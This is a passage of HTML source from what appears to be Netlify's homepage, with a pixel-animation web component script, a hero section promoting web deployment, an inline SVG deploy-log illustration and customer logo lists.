                                            this.isShimmer ? this.shimmer() : this.size += this.sizeStep,
                                            this.draw()
                                        }
                                        shimmer() {
                                            this.size >= this.maxSize ? this.isReverse = !0 : this.size <= this.minSize && (this.isReverse = !1),
                                            this.isReverse ? this.size -= this.speed : this.size += this.speed
                                        }
                                    }
                                    class h extends HTMLElement {
                                        static register(t="pixel-canvas") {
                                            "customElements"in window && customElements.define(t, this)
                                        }
                                        static css = `
    :host {
      display: grid;
      inline-size: 100%;
      block-size: 100%;
      overflow: hidden;
    }
  `;
                                        get colors() {
                                            return this.dataset.colors?.split(",") || ["#f8fafc", "#f1f5f9", "#cbd5e1"]
                                        }
                                        get gap() {
                                            const t = this.dataset.gap || 5
                                              , e = 4
                                              , s = 50;
                                            return t <= e ? e : t >= s ? s : parseInt(t)
                                        }
                                        get speed() {
                                            const t = this.dataset.speed || 35
                                              , e = 0
                                              , s = 100
                                              , i = .001;
                                            return t <= e || this.reducedMotion ? e : t >= s ? s * i : parseInt(t) * i
                                        }
                                        connectedCallback() {
                                            const t = document.createElement("canvas")
                                              , e = new CSSStyleSheet;
                                            this._parent = this.parentNode,
                                            this.shadowroot = this.attachShadow({
                                                mode: "open"
                                            }),
                                            e.replaceSync(h.css),
                                            this.shadowroot.adoptedStyleSheets = [e],
                                            this.shadowroot.append(t),
                                            this.canvas = this.shadowroot.querySelector("canvas"),
                                            this.ctx = this.canvas.getContext("2d"),
                                            this.timeInterval = 1e3 / 60,
                                            this.timePrevious = performance.now(),
                                            this.reducedMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches,
                                            this.init(),
                                            this.resizeObserver = new ResizeObserver( () => this.init()),
                                            this.resizeObserver.observe(this)
                                        }
                                        disconnectedCallback() {
                                            this.resizeObserver.disconnect()
                                        }
                                        init() {
                                            const t = this.getBoundingClientRect()
                                              , e = Math.floor(t.width)
                                              , s = Math.floor(t.height);
                                            this.pixels = [],
                                            this.canvas.width = e,
                                            this.canvas.height = s,
                                            this.canvas.style.width = `${e}px`,
                                            this.canvas.style.height = `${s}px`,
                                            this.createPixels()
                                        }
                                        getDistanceToCanvasCenter(t, e) {
                                            const s = t - this.canvas.width / 2
                                              , i = e - this.canvas.height / 2;
                                            return Math.sqrt(s * s + i * i)
                                        }
                                        createPixels() {
                                            for (let t = 0; t < this.canvas.width; t += this.gap)
                                                for (let e = 0; e < this.canvas.height; e += this.gap) {
                                                    const s = this.colors[Math.floor(Math.random() * this.colors.length)]
                                                      , i = this.reducedMotion ? 0 : this.getDistanceToCanvasCenter(t, e);
                                                    this.pixels.push(new o(this.canvas,this.ctx,t,e,s,this.speed,i))
                                                }
                                        }
                                        animate() {
                                            requestAnimationFrame( () => this.animate());
                                            const t = performance.now()
                                              , e = t - this.timePrevious;
                                            if (!(e < this.timeInterval)) {
                                                this.timePrevious = t - e % this.timeInterval,
                                                this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
                                                for (let s = 0; s < this.pixels.length; s++)
                                                    this.pixels[s].appear()
                                            }
                                        }
                                    }
                                    h.register();
                                </script>
                                <div class="hero-content | l-stack l-center text-center" data-astro-cid-f2t6dg3d="">
                                    <h1 class="title | text-5 l-center a-fade-in" style="--fadeIn-delay: 200ms" data-astro-cid-f2t6dg3d="">Push your ideas to the web</h1>
                                    <p class="supporting | text-05 a-fade-in" style="--fadeIn-delay: 275ms" data-astro-cid-f2t6dg3d="">Deploy any modern frontend stack, from marketing sites to AI apps. Join millions of developers and teams shipping faster on Netlify. </p>
                                    <div class="ctas | l-grid a-fade-in" style="--fadeIn-delay: 300ms" data-theme="dark" data-astro-cid-f2t6dg3d="">
                                        <a data-type="primary" data-inline-icon="false" data-icon-only="false" id="cta-hero-get-started" href="https://app.netlify.com/signup?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795" data-astro-cid-f2t6dg3d="true" data-astro-cid-tcbm7f7q="true" class="button">Get started </a>
                                        <a data-type="default" data-inline-icon="false" data-icon-only="false" id="cta-hero-request-demo" href="/contact/sales/" data-astro-cid-f2t6dg3d="true" data-astro-cid-tcbm7f7q="true" class="button">Request a demo </a>
                                    </div>
                                </div>
                                <div class="interface-wrapper | l-overlay-stack l-center" data-astro-cid-f2t6dg3d="">
                                    <div class="interface-gradient" data-astro-cid-f2t6dg3d=""></div>
                                    <div class="interface | l-overlay-stack a-fade-in" style="--fadeIn-delay: 350ms" data-astro-cid-f2t6dg3d="">
                                        <figure class="ui-deploy-log" data-astro-cid-65apewjt="">
                                            <img src="/images/home/ui-deploy-log.svg" width="870" height="440" alt="" data-astro-cid-65apewjt="">
                                            <svg width="870" height="440" viewBox="0 0 870 440" fill="none" xmlns="http://www.w3.org/2000/svg" data-astro-cid-65apewjt="">
                                                <defs data-astro-cid-65apewjt="">
                                                    <g id="deploy-log-badge-progress" data-astro-cid-65apewjt="">
                                                        <g class="icon-badge" data-astro-cid-65apewjt="">
                                                            <rect x="19.4238" width="67.0417" height="16.0208" rx="4.53125" fill="#FDF5D8" data-astro-cid-65apewjt=""></rect>
                                                            <path d="M23.6426 11.5104H25.2017V4.06079H23.6426V11.5104Z" fill="#603408" data-astro-cid-65apewjt=""></path>
                                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M39.4809 4.06079H36.373V11.5104H37.9321V9.1614H39.4035C40.9729 9.1614 42.0622 8.13921 42.0622 6.62142C42.0622 5.08298 41.0142 4.06079 39.4809 4.06079ZM37.9321 7.93787V5.2998H39.0679C39.9662 5.2998 40.4773 5.75927 40.4773 6.62658C40.4773 7.47324 39.9559 7.93787 39.0627 7.93787H37.9321Z" fill="#603408" data-astro-cid-65apewjt=""></path>
                                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M47.5391 8.66594C47.5391 10.5193 48.5922 11.6293 50.3423 11.6293C52.0924 11.6293 53.1456 10.5245 53.1456 8.66594C53.1456 6.82291 52.077 5.70264 50.3423 5.70264C48.6077 5.70264 47.5391 6.82807 47.5391 8.66594ZM51.602 8.66594C51.602 9.79138 51.1425 10.4419 50.3423 10.4419C49.537 10.4419 49.0827 9.79138 49.0827 8.66594C49.0827 7.55083 49.5421 6.89519 50.3423 6.89519C51.1374 6.89519 51.602 7.55083 51.602 8.66594Z" fill="#603408" data-astro-cid-65apewjt=""></path>
                                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M69.3503 9.90496H70.7494C70.5274 10.9633 69.5413 11.6293 68.1474 11.6293C66.4128 11.6293 65.3906 10.5348 65.3906 8.69692C65.3906 6.84872 66.4335 5.70264 68.1268 5.70264C69.8046 5.70264 70.7958 6.77645 70.7958 8.57302V9.02216H66.8878V9.0996C66.9084 9.96691 67.404 10.509 68.1887 10.509C68.7824 10.509 69.1903 10.2921 69.3503 9.90496ZM68.1319 6.82291C67.435 6.82291 66.9446 7.32368 66.8929 8.08774H69.3193C69.2884 7.30819 68.834 6.82291 68.1319 6.82291Z" fill="#603408" data-astro-cid-65apewjt=""></path>
                                                            <path d="M74.2707 5.70264C72.851 5.70264 71.9011 6.42023 71.9011 7.48372C71.9011 8.35619 72.438 8.87761 73.5428 9.12025L74.5753 9.35256C75.0761 9.46614 75.2929 9.64167 75.2929 9.93077C75.2929 10.3076 74.8902 10.5658 74.3069 10.5658C73.708 10.5658 73.3415 10.3335 73.2279 9.9411H71.7617C71.865 11.0149 72.7736 11.6293 74.2759 11.6293C75.7679 11.6293 76.7849 10.8962 76.7849 9.77073C76.7849 8.92407 76.2893 8.45944 75.1845 8.2168L74.1158 7.98449C73.5893 7.86575 73.3466 7.68506 73.3466 7.39596C73.3466 7.02425 73.7441 6.77129 74.281 6.77129C74.8386 6.77129 75.1845 7.0036 75.2619 7.38047H76.6507C76.5681 6.30666 75.7162 5.70264 74.2707 5.70264Z" fill="#603408" data-astro-cid-65apewjt=""></path>
                                                            <path d="M80.1555 5.70264C78.7358 5.70264 77.7859 6.42023 77.7859 7.48372C77.7859 8.35619 78.3228 8.87761 79.4276 9.12025L80.4601 9.35256C80.9608 9.46614 81.1777 9.64167 81.1777 9.93077C81.1777 10.3076 80.775 10.5658 80.1916 10.5658C79.5928 10.5658 79.2262 10.3335 79.1127 9.9411H77.6465C77.7497 11.0149 78.6583 11.6293 80.1607 11.6293C81.6526 11.6293 82.6697 10.8962 82.6697 9.77073C82.6697 8.92407 82.174 8.45944 81.0693 8.2168L80.0006 7.98449C79.474 7.86575 79.2314 7.68506 79.2314 7.39596C79.2314 7.02425 79.6289 6.77129 80.1658 6.77129C80.7234 6.77129 81.0693 7.0036 81.1467 7.38047H82.5354C82.4528 6.30666 81.601 5.70264 80.1555 5.70264Z" fill="#603408" data-astro-cid-65apewjt=""></path>
                                                            <path d="M61.1992 5.82632V11.5103H62.7015V8.33016C62.7015 7.52997 63.2642 7.03953 64.0851 7.03953C64.3277 7.03953 64.6788 7.08083 64.7975 7.12213V5.80051C64.6685 5.75921 64.4155 5.7334 64.209 5.7334C63.4862 5.7334 62.8977 6.16189 62.748 6.72977H62.6551V5.82632H61.1992Z" fill="#603408" data-astro-cid-65apewjt=""></path>
                                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M56.8833 13.6631C55.3707 13.6631 54.3692 13.0074 54.2763 12.0111H55.7631C55.8405 12.3724 56.2638 12.5996 56.9143 12.5996C57.7197 12.5996 58.1895 12.2176 58.1895 11.5619V10.5036H58.0965C57.7816 11.1025 57.1828 11.4277 56.3826 11.4277C54.9629 11.4277 54.0801 10.3229 54.0801 8.61927C54.0801 6.85884 54.968 5.7334 56.4136 5.7334C57.1828 5.7334 57.8384 6.11543 58.143 6.73493H58.2359V5.82632H59.6918V11.5C59.6918 12.8268 58.6025 13.6631 56.8833 13.6631ZM56.904 10.2764C57.7197 10.2764 58.205 9.63629 58.205 8.61411C58.205 7.59192 57.7145 6.95176 56.904 6.95176C56.0935 6.95176 55.6237 7.59192 55.6237 8.61411C55.6237 9.63629 56.0883 10.2764 56.904 10.2764Z" fill="#603408" data-astro-cid-65apewjt=""></path>
                                                            <path d="M43.3477 11.5103V5.82632H44.8035V6.72977H44.8964C45.0461 6.16189 45.6347 5.7334 46.3574 5.7334C46.5639 5.7334 46.8169 5.75921 46.946 5.80051V7.12213C46.8272 7.08083 46.4762 7.03953 46.2335 7.03953C45.4127 7.03953 44.85 7.52997 44.85 8.33016V11.5103H43.3477Z" fill="#603408" data-astro-cid-65apewjt=""></path>
                                                            <path d="M26.8594 11.5105V5.82654H28.3152V6.74031H28.4081C28.6714 6.10015 29.2496 5.70264 30.0911 5.70264C31.356 5.70264 32.0374 6.47702 32.0374 7.83477V11.5105H30.5351V8.1755C30.5351 7.3753 30.1995 6.95714 29.4871 6.95714C28.7902 6.95714 28.3617 7.45274 28.3617 8.22196V11.5105H26.8594Z" fill="#603408" data-astro-cid-65apewjt=""></path>
                                                        </g>
                                                    </g>
                                                    <g id="deploy-log-badge-complete" data-astro-cid-65apewjt="">
                                                        <path class="icon-check" fill-rule="evenodd" clip-rule="evenodd" d="M13.084 8.66138C13.084 12.2744 10.155 15.2034 6.54199 15.2034C2.92895 15.2034 0 12.2744 0 8.66138C0 5.04833 2.92895 2.11938 6.54199 2.11938C10.155 2.11938 13.084 5.04833 13.084 8.66138ZM4.96517 11.2672C5.28802 11.5901 5.81092 11.5919 6.13597 11.2712L6.82984 10.5868L10.0936 7.32299C10.3725 7.04407 10.373 6.59124 10.0945 6.31282L9.82482 6.04311C9.54641 5.76469 9.09358 5.7651 8.81466 6.04402L5.55958 9.2991L4.28061 8.02012C4.0022 7.74171 3.54936 7.74212 3.27045 8.02103L3.00025 8.29123C2.72133 8.57015 2.72092 9.02298 2.99934 9.3014L4.96517 11.2672Z" fill="#31A855" data-astro-cid-65apewjt=""></path>
                                                        <g class="icon-badge" data-astro-cid-65apewjt="">
                                                            <rect x="20.6641" width="63.6458" height="17.3229" rx="5" fill="#E7FCE9" data-astro-cid-65apewjt=""></rect>
                                                            <path d="M59.3516 4.01831V12.6615H61.0041V4.01831H59.3516Z" fill="#0F4A21" data-astro-cid-65apewjt=""></path>
                                                            <path d="M71.8461 4.91553H70.1936V6.46584H69.2168V7.72086H70.1936V10.9748C70.1936 12.1901 70.7955 12.6841 72.3174 12.6841C72.6354 12.6841 72.9421 12.6501 73.1465 12.6103V11.3894C72.9875 11.4064 72.874 11.4178 72.6582 11.4178C72.096 11.4178 71.8461 11.1565 71.8461 10.5943V7.72086H73.1465V6.46584H71.8461V4.91553Z" fill="#0F4A21" data-astro-cid-65apewjt=""></path>
                                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M80.0684 10.8953H78.5295C78.3534 11.3212 77.9048 11.5597 77.2517 11.5597C76.3886 11.5597 75.8434 10.9634 75.8207 10.0094V9.92418H80.1195V9.43013C80.1195 7.4539 79.0292 6.27271 77.1836 6.27271C75.3209 6.27271 74.1738 7.5334 74.1738 9.56642C74.1738 11.5881 75.2982 12.792 77.2063 12.792C78.7396 12.792 79.8242 12.0594 80.0684 10.8953ZM75.8264 8.89632C75.8832 8.05585 76.4226 7.50501 77.1893 7.50501C77.9616 7.50501 78.4613 8.03882 78.4954 8.89632H75.8264Z" fill="#0F4A21" data-astro-cid-65apewjt=""></path>
                                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M66.7736 10.8953H68.3126C68.0684 12.0594 66.9837 12.792 65.4505 12.792C63.5424 12.792 62.418 11.5881 62.418 9.56642C62.418 7.5334 63.5651 6.27271 65.4277 6.27271C67.2734 6.27271 68.3637 7.4539 68.3637 9.43013V9.92418H64.0648V10.0094C64.0875 10.9634 64.6327 11.5597 65.4959 11.5597C66.149 11.5597 66.5976 11.3212 66.7736 10.8953ZM65.4334 7.50501C64.6668 7.50501 64.1273 8.05585 64.0705 8.89632H66.7395C66.7055 8.03882 66.2057 7.50501 65.4334 7.50501Z" fill="#0F4A21" data-astro-cid-65apewjt=""></path>
                                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M55.3947 6.30688C56.9791 6.30688 57.9502 7.51647 57.9502 9.53245C57.9502 11.5428 56.9905 12.758 55.4231 12.758C54.5259 12.758 53.8388 12.3662 53.5321 11.7074H53.4299V14.7342H51.7773V6.4091H53.3788V7.43697H53.481C53.8217 6.7328 54.5316 6.30688 55.3947 6.30688ZM54.8325 11.4235C55.7241 11.4235 56.2522 10.7136 56.2522 9.53245C56.2522 8.35694 55.7184 7.64708 54.8382 7.64708C53.958 7.64708 53.4128 8.36829 53.4128 9.53813C53.4128 10.708 53.958 11.4235 54.8325 11.4235Z" fill="#0F4A21" data-astro-cid-65apewjt=""></path>
                                                            <path d="M40.9883 6.409V12.6614H42.6408V8.89064C42.6408 8.17511 43.1008 7.65266 43.7482 7.65266C44.3956 7.65266 44.7817 8.03882 44.7817 8.70892V12.6614H46.3718V8.81681C46.3718 8.14103 46.8034 7.65266 47.4735 7.65266C48.172 7.65266 48.5184 8.02746 48.5184 8.78274V12.6614H50.1709V8.36819C50.1709 7.0791 49.3929 6.27271 48.1436 6.27271C47.269 6.27271 46.5478 6.73269 46.2582 7.4255H46.156C45.9061 6.70997 45.3042 6.27271 44.424 6.27271C43.6005 6.27271 42.9475 6.70997 42.6919 7.4255H42.5897V6.409H40.9883Z" fill="#0F4A21" data-astro-cid-65apewjt=""></path>
                                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M36.5523 12.792C34.6272 12.792 33.4688 11.571 33.4688 9.53234C33.4688 7.51069 34.6443 6.27271 36.5523 6.27271C38.4604 6.27271 39.6359 7.50501 39.6359 9.53234C39.6359 11.5767 38.4775 12.792 36.5523 12.792ZM36.5523 11.4859C37.4326 11.4859 37.938 10.7703 37.938 9.53234C37.938 8.30572 37.4269 7.58451 36.5523 7.58451C35.6721 7.58451 35.1667 8.30572 35.1667 9.53234C35.1667 10.7703 35.6665 11.4859 36.5523 11.4859Z" fill="#0F4A21" data-astro-cid-65apewjt=""></path>
                                                            <path d="M24.957 8.56138C24.957 11.2247 26.4278 12.8716 28.8016 12.8716C30.7778 12.8716 32.2202 11.6734 32.3622 9.92429H30.6926C30.5279 10.8272 29.7897 11.4065 28.8073 11.4065C27.5125 11.4065 26.7118 10.3161 26.7118 8.56138C26.7118 6.80662 27.5125 5.71629 28.8016 5.71629C29.7783 5.71629 30.5223 6.34096 30.687 7.28932H32.3565C32.2316 5.52889 30.7437 4.25684 28.8016 4.25684C26.4222 4.25684 24.957 5.89801 24.957 8.56138Z" fill="#0F4A21" data-astro-cid-65apewjt=""></path>
                                                        </g>
                                                    </g>
                                                    <g id="deploy-log-sparkle" class="icon-sparkle" data-astro-cid-65apewjt="">
                                                        <path d="M3.84038 7C6.67952 7.25842 8.92019 10.2937 8.92019 14C8.92019 13.8861 8.9223 13.7729 8.92651 13.6603C9.05846 10.1097 11.2481 7.25041 14 7C11.1609 6.74158 8.92019 3.70632 8.92019 0C8.92019 0.100194 8.91851 0.199959 8.91527 0.299009C8.8016 3.77721 6.71366 6.60094 4.05102 6.97527C4.01701 6.98027 3.98301 6.98456 3.94886 6.98857C3.91275 6.993 3.87664 6.99671 3.84038 7Z" fill="url(#icon-sparkle-gradient-1)" data-astro-cid-65apewjt=""></path>
                                                        <path d="M7.9094e-05 9.55697C1.6604 9.70809 2.97074 11.4831 2.97074 13.6506C2.97074 13.5839 2.97198 13.5177 2.97444 13.4519C3.0516 11.3755 4.33212 9.70341 5.94141 9.55697C4.28109 9.40584 2.97074 7.63083 2.97074 5.46338C2.97074 5.52197 2.96976 5.58032 2.96787 5.63824C2.90139 7.67229 1.68037 9.3236 0.123258 9.54251C0.103372 9.54543 0.083485 9.54794 0.0635168 9.55028C0.042399 9.55287 0.0212797 9.55504 7.9094e-05 9.55697Z" fill="url(#icon-sparkle-gradient-2)" data-astro-cid-65apewjt=""></path>
                                                        <path d="M2.96119 3.06502C4.07511 3.16641 4.95423 4.35728 4.95423 5.81143C4.95423 5.76674 4.95505 5.72232 4.95671 5.67813C5.00848 4.2851 5.86758 3.16327 6.94727 3.06502C5.83335 2.96363 4.95423 1.77276 4.95423 0.318604C4.95423 0.357914 4.95357 0.397058 4.9523 0.43592C4.9077 1.80057 4.08851 2.90845 3.04383 3.05532C3.03049 3.05728 3.01715 3.05896 3.00375 3.06053C2.98958 3.06227 2.97542 3.06373 2.96119 3.06502Z" fill="url(#icon-sparkle-gradient-3)" data-astro-cid-65apewjt=""></path>
                                                        <linearGradient id="icon-sparkle-gradient" data-astro-cid-65apewjt="">
                                                            <stop stop-color="#FFC100" data-astro-cid-65apewjt=""></stop>
                                                            <stop offset="0.4919" stop-color="#FDBF00" data-astro-cid-65apewjt=""></stop>
                                                            <stop offset="0.6691" stop-color="#F6BA00" data-astro-cid-65apewjt=""></stop>
                                                            <stop offset="0.7954" stop-color="#EAB100" data-astro-cid-65apewjt=""></stop>
                                                            <stop offset="0.8975" stop-color="#D9A400" data-astro-cid-65apewjt=""></stop>
                                                            <stop offset="0.9839" stop-color="#C39400" data-astro-cid-65apewjt=""></stop>
                                                            <stop offset="1" stop-color="#BF9100" data-astro-cid-65apewjt=""></stop>
                                                        </linearGradient>
                                                        <linearGradient id="icon-sparkle-gradient-1" href="#icon-sparkle-gradient" x1="5.4793" y1="10.5" x2="12.4783" y2="3.61921" gradientUnits="userSpaceOnUse" data-astro-cid-65apewjt=""></linearGradient>
                                                        <linearGradient id="icon-sparkle-gradient-2" href="#icon-sparkle-gradient" x1="0.958512" y1="11.6038" x2="5.05151" y2="7.57988" gradientUnits="userSpaceOnUse" data-astro-cid-65apewjt=""></linearGradient>
                                                        <linearGradient id="icon-sparkle-gradient-3" href="#icon-sparkle-gradient" x1="3.60421" y1="4.43822" x2="6.35023" y2="1.73858" gradientUnits="userSpaceOnUse" data-astro-cid-65apewjt=""></linearGradient>
                                                    </g>
                                                </defs>
                                                <g data-animate="deploy-log-badges" data-astro-cid-65apewjt="">
                                                    <use href="#deploy-log-badge-complete" x="360" y="84" data-astro-cid-65apewjt=""></use>
                                                    <use href="#deploy-log-badge-complete" x="360" y="132" data-astro-cid-65apewjt=""></use>
                                                    <g class="progress-badge" transform="translate(360, 180)" data-astro-cid-65apewjt="">
                                                        <path class="icon-cog" fill-rule="evenodd" clip-rule="evenodd" d="M6.49007 1.31982C6.07298 1.31982 5.73486 1.65794 5.73486 2.07503V3.32704C5.12458 3.45093 4.55652 3.6911 4.05483 4.02344L3.169 3.1376C2.87407 2.84268 2.3959 2.84268 2.10097 3.1376L1.81728 3.4213C1.52235 3.71622 1.52235 4.1944 1.81728 4.48932L2.70321 5.37526C2.37109 5.8768 2.13105 6.44464 2.00722 7.05469H0.755208C0.338118 7.05469 0 7.39281 0 7.8099V8.2111C0 8.62819 0.338118 8.96631 0.755208 8.96631H2.00722C2.13109 9.57655 2.37124 10.1446 2.70354 10.6462L1.81815 11.5316C1.52322 11.8265 1.52322 12.3047 1.81815 12.5996L2.10184 12.8833C2.39677 13.1783 2.87494 13.1783 3.16987 12.8833L4.05532 11.9979C4.55689 12.3301 5.12478 12.5701 5.73486 12.694V13.946C5.73486 14.3631 6.07298 14.7012 6.49007 14.7012H6.89128C7.30837 14.7012 7.64648 14.3631 7.64648 13.946V12.694C8.25677 12.5701 8.82483 12.3299 9.32652 11.9976L10.2124 12.8834C10.5073 13.1783 10.9854 13.1783 11.2804 12.8834L11.5641 12.5997C11.859 12.3048 11.859 11.8266 11.5641 11.5317L10.6781 10.6457C11.0103 10.1442 11.2503 9.57635 11.3741 8.96631H12.6261C13.0432 8.96631 13.3813 8.62819 13.3813 8.2111V7.8099C13.3813 7.39281 13.0432 7.05469 12.6261 7.05469H11.3741C11.2503 6.44445 11.0101 5.87643 10.6778 5.37476L11.5632 4.48937C11.8581 4.19445 11.8581 3.71628 11.5632 3.42135L11.2795 3.13765C10.9846 2.84273 10.5064 2.84273 10.2115 3.13765L9.32603 4.02311C8.82446 3.69094 8.25657 3.45088 7.64648 3.32704V2.07503C7.64648 1.65794 7.30837 1.31982 6.89128 1.31982H6.49007ZM8.6023 8.01058C8.6023 9.06634 7.74643 9.9222 6.69067 9.9222C5.63492 9.9222 4.77905 9.06634 4.77905 8.01058C4.77905 6.95482 5.63492 6.09896 6.69067 6.09896C7.74643 6.09896 8.6023 6.95482 8.6023 8.01058Z" fill="#FBB13D" data-astro-cid-65apewjt=""></path>
                                                        <use href="#deploy-log-badge-progress" data-astro-cid-65apewjt=""></use>
                                                    </g>
                                                    <use href="#deploy-log-badge-complete" x="360" y="180" data-astro-cid-65apewjt=""></use>
                                                </g>
                                                <use href="#deploy-log-sparkle" x="416" y="373" data-astro-cid-65apewjt=""></use>
                                                <rect data-animate="deploy-log-code-cover" x="245" y="236" width="560" height="160" fill="#181A1C" data-astro-cid-65apewjt=""></rect>
                                                <g class="icon-loader" id="deploy-log-loader" transform="translate(248,246)" data-astro-cid-65apewjt="">
                                                    <path d="M5.8125 11.7373L1 0H2.1416L6.94727 11.7373H5.8125Z" fill="white" data-astro-cid-65apewjt=""></path>
                                                    <path d="M7.23242 7.08008H0V6H7.23242V7.08008Z" fill="white" data-astro-cid-65apewjt=""></path>
                                                    <path d="M2.13477 11.7373H1L5.80566 0H6.94727L2.13477 11.7373Z" fill="white" data-astro-cid-65apewjt=""></path>
                                                    <path d="M4.06641 14.1025H3V0H4.06641V14.1025Z" fill="white" data-astro-cid-65apewjt=""></path>
                                                </g>
                                            </svg>
                                        </figure>
                                        <script type="module">
                                            const o = document.querySelector(".ui-deploy-log");
                                            if (o) {
                                                let t = function(s, r) {
                                                    s.forEach(e => {
                                                        e.isIntersecting && (e.target.classList.add("in-view"),
                                                        r.disconnect())
                                                    }
                                                    )
                                                };
                                                const n = {
                                                    threshold: .8
                                                };
                                                new IntersectionObserver(t,n).observe(o)
                                            }
                                        </script>
                                    </div>
                                </div>
                            </section>
                            <div class="logos | l-center logo-marquee l-grid" data-astro-cid-f2t6dg3d="true" data-astro-cid-h2jlyvcc="">
                                <ul role="list" data-astro-cid-h2jlyvcc="">
                                    <li data-astro-cid-f2t6dg3d="">
                                        <img src="/images/home/logos/navan.svg" alt="Navan" height="20" width="89" data-astro-cid-f2t6dg3d="">
                                    </li>
                                    <li data-astro-cid-f2t6dg3d="">
                                        <img src="/images/home/logos/contentful.svg" alt="Contentful" height="30" width="146" data-astro-cid-f2t6dg3d="">
                                    </li>
                                    <li data-astro-cid-f2t6dg3d="">
                                        <img src="/images/home/logos/unilever.svg" alt="Unilever" height="69" width="62" data-astro-cid-f2t6dg3d="">
                                    </li>
                                    <li data-astro-cid-f2t6dg3d="">
                                        <img src="/images/home/logos/stack-overflow.svg" alt="Stack Overflow" height="34" width="172" data-astro-cid-f2t6dg3d="">
                                    </li>
                                    <li data-astro-cid-f2t6dg3d="">
                                        <img src="/images/home/logos/riot-games.svg" alt="Riot Games" height="28" width="101" data-astro-cid-f2t6dg3d="">
                                    </li>
                                    <li data-astro-cid-f2t6dg3d="">
                                        <img src="/images/home/logos/nike.svg" alt="Nike" height="29" width="80" data-astro-cid-f2t6dg3d="">
                                    </li>
                                    <li data-astro-cid-f2t6dg3d="">
                                        <img src="/images/home/logos/kubernetes.svg" alt="Kubernetes" height="33" width="181" data-astro-cid-f2t6dg3d="">
                                    </li>
                                    <li data-astro-cid-f2t6dg3d="">
                                        <img src="/images/home/logos/figma.svg" alt="Figma" height="35" width="93" data-astro-cid-f2t6dg3d="">
                                    </li>
                                </ul>
                                <ul role="list" aria-hidden="true" data-astro-cid-h2jlyvcc="">
                                    <li data-astro-cid-f2t6dg3d="">
                                        <img src="/images/home/logos/navan.svg" alt="Navan" height="20" width="89" data-astro-cid-f2t6dg3d="">
                                    </li>
                                    <li data-astro-cid-f2t6dg3d="">
                                        <img src="/images/home/logos/contentful.svg" alt="Contentful" height="30" width="146" data-astro-cid-f2t6dg3d="">
                                    </li>
                                    <li data-astro-cid-f2t6dg3d="">
                                        <img src="/images/home/logos/unilever.svg" alt="Unilever" height="69" width="62" data-astro-cid-f2t6dg3d="">
                                    </li>
                                    <li data-astro-cid-f2t6dg3d="">
                                        <img src="/images/home/logos/stack-overflow.svg" alt="Stack Overflow" height="34" width="172" data-astro-cid-f2t6dg3d="">
                                    </li>
                                    <li data-astro-cid-f2t6dg3d="">
                                        <img src="/images/home/logos/riot-games.svg" alt="Riot Games" height="28" width="101" data-astro-cid-f2t6dg3d="">
                                    </li>
                                    <li data-astro-cid-f2t6dg3d="">
                                        <img src="/images/home/logos/nike.svg" alt="Nike" height="29" width="80" data-astro-cid-f2t6dg3d="">
                                    </li>
                                    <li data-astro-cid-f2t6dg3d="">
                                        <img src="/images/home/logos/kubernetes.svg" alt="Kubernetes" height="33" width="181" data-astro-cid-f2t6dg3d="">
                                    </li>
                                    <li data-astro-cid-f2t6dg3d="">
                                        <img src="/images/home/logos/figma.svg" alt="Figma" height="35" width="93" data-astro-cid-f2t6dg3d="">
                                    </li>
                                </ul>
                            </div>
                            <script type="module" src="/_astro/HomeHero.astro_astro_type_script_index_0_lang.BMvNyWPC.js"></script>
                        </div>
                    </div>
                </section>
                <section class="pancake | l-section pancake-margin-top-override" data-sb-field-path="GZpQT76vrL14dXDLi338hK:pancakes.1" data-astro-cid-5mutinvq="" style="--breakout-area: content;--margin-block-start: var(--space-3xl);--padding-block-start: var(--space-s);">
                    <div class="pancake-content | l-stack l-stack-large" data-astro-cid-5mutinvq="" style="--breakout-area: content;--margin-block-start: var(--space-3xl);--padding-block-start: var(--space-s);">
                        <div class="ingredient l-breakout ingredient-section-header" data-astro-cid-gfez5emt="" style="">
                            <div class="b-heading text-center" data-sb-field-path=".ingredients.0" _key="0bd04ae8-0027-46f0-8a01-de2c485c22b5" _type="sectionHeader" data-astro-cid-wk2votdk="" style="--supporting-max: 72ch;--heading-space: var(--space-s);--subheading-space: var(--space-l);--supporting-space: var(--space-l);">
                                <h2 class="heading" data-sb-field-path=".heading" data-astro-cid-wk2votdk="true">One platform. Prompt to production.</h2>
                                <div class="prose l-stack l-stack-medium supporting text-05" data-sb-field-path=".supporting.content" _type="markdownBlock" data-astro-cid-wk2votdk="true" data-astro-cid-cnvtppup="" style="--prose-max-width: 72ch;">
                                    <p>A developer and agent experience that just works–optimized builds, collaborative previews, and instant rollbacks on a global edge network. Focus on your users and code while we handle the rest.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
                <section class="pancake | l-section pancake-margin-top-override" data-sb-field-path="GZpQT76vrL14dXDLi338hK:pancakes.2" data-astro-cid-5mutinvq="" style="--breakout-area: content;--margin-block-start: var(--space-xl);">
                    <div class="pancake-content | l-stack l-stack-medium" data-astro-cid-5mutinvq="" style="--breakout-area: content;--margin-block-start: var(--space-xl);">
                        <div class="ingredient l-breakout ingredient-columns" data-astro-cid-gfez5emt="" style="">
                            <div class="l-grid ingredient-columns" data-sb-field-path=".ingredients.0" style="--grid-gap:var(--space-l);--grid-min:320px;--grid-align:stretch" data-astro-cid-fsqfrxl4="">
                                <div data-sb-field-path=".columns.0" class="column l-stack l-stack-medium" style="" data-astro-cid-fsqfrxl4="">
                                    <div class="ingredient" data-astro-cid-gfez5emt="" style="">
                                        <div class="card | l-flex-stack l-stack-small" data-options="" data-sb-field-path=".items.0" data-astro-cid-dohjnao5="">
                                            <div class="ingredient" data-astro-cid-gfez5emt="" style="">
                                                <h2 data-sb-field-path=".items.0" data-astro-cid-u4qoyrkz="true" class="heading l-stack l-stack-3xs font-heading text-2 font-bold text-left">
                                                    <span class="heading-eyebrow c-badge" data-mode="light" data-type="light" data-size="small" data-color="teal" data-astro-cid-u4qoyrkz="true">Build &amp;integrate </span>
